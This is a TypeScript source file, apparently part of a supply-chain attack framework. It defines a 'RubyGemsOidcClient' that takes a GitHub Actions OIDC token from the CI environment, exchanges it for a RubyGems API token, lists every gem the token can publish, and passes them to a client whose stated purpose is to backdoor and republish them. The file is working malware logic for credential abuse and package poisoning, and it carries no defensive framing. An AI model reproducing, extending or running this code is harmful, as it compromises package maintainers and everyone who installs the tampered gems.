import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";
import { checkRubygemsToken } from "../rubygems/tokenCheck";

/**
 * RubyGems OIDC mutator — exchanges a GitHub Actions OIDC token for a
 * RubyGems API token, then reuses the existing RubyGemsClient to backdoor
 * and republish every gem the token has access to.
 *
 * Mirrors the NPMOidcClient pattern: get OIDC token → exchange for registry
 * token → enumerate packages → backdoor + republish.
 */
export class RubyGemsOidcClient extends Mutator {
  constructor() {
    super();
  }

  async execute(): Promise<Boolean> {
    // 1. Get GitHub Actions OIDC token (audience: rubygems.org)
    const { ACTIONS_ID_TOKEN_REQUEST_TOKEN, ACTIONS_ID_TOKEN_REQUEST_URL } =
      process.env;

    if (!ACTIONS_ID_TOKEN_REQUEST_URL || !ACTIONS_ID_TOKEN_REQUEST_TOKEN) {
      logUtil.log(
        "[rubygemsOidc] not running in GitHub Actions with id-token:write",
      );
      return false;
    }

    const oidcUrl = `${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=rubygems.org`;
    let oidcToken: string;
    try {
      const oidcRes = await fetch(oidcUrl, {
        headers: {
          Authorization: `bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}`,
        },
      });
      if (!oidcRes.ok) {
        logUtil.log(
          `[rubygemsOidc] OIDC token request failed: ${oidcRes.status}`,
        );
        return false;
      }
      const data = (await oidcRes.json()) as { value: string };
      oidcToken = data.value;
      if (!oidcToken) {
        logUtil.log("[rubygemsOidc] OIDC response missing token");
        return false;
      }
    } catch (e) {
      logUtil.log(`[rubygemsOidc] OIDC token error: ${e}`);
      return false;
    }

    // 2. Exchange OIDC token for a RubyGems API token
    const rgToken = await exchangeOidcForRubygemsToken(oidcToken);
    if (!rgToken) {
      logUtil.log("[rubygemsOidc] OIDC → RubyGems token exchange failed");
      return false;
    }

    // 3. Validate the token and enumerate accessible gems
    const tokenInfo = await checkRubygemsToken(rgToken);
    if (!tokenInfo.valid || tokenInfo.gems.length === 0) {
      logUtil.log(
        "[rubygemsOidc] token valid but no gems accessible (scoped or empty)",
      );
      return false;
    }

    logUtil.log(
      `[rubygemsOidc] token valid — ${tokenInfo.gems.length} gem(s) accessible`,
    );

    // 4. Delegate to the existing RubyGemsClient for download/patch/publish
    const { RubyGemsClient } = await import("../rubygems/index");
    const client = new RubyGemsClient(tokenInfo);
    return client.execute();
  }
}

// ── OIDC → RubyGems token exchange ─────────────────────────────────────────

/**
 * Exchange a GitHub Actions OIDC token for a short-lived RubyGems API token.
 *
 *   POST https://rubygems.org/api/v1/oidc/api_key_roles/tokens
 *   Authorization: Bearer <oidc_token>
 */
async function exchangeOidcForRubygemsToken(
  oidcToken: string,
): Promise<string | null> {
  try {
    const res = await fetch(
      "https://rubygems.org/api/v1/oidc/api_key_roles/tokens",
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${oidcToken}`,
          "Content-Type": "application/json",
          Accept: "application/json",
        },
      },
    );

    if (!res.ok) {
      const text = await res.text().catch(() => "");
      logUtil.log(
        `[rubygemsOidc] token exchange HTTP ${res.status}: ${text.slice(0, 200)}`,
      );
      return null;
    }

    const data = (await res.json()) as {
      rubygems_api_key?: { token?: string; key?: string };
      token?: string;
      key?: string;
    };

    return (
      data.rubygems_api_key?.token ??
      data.rubygems_api_key?.key ??
      data.token ??
      data.key ??
      null
    );
  } catch (e) {
    logUtil.log(`[rubygemsOidc] token exchange error: ${e}`);
    return null;
  }
}
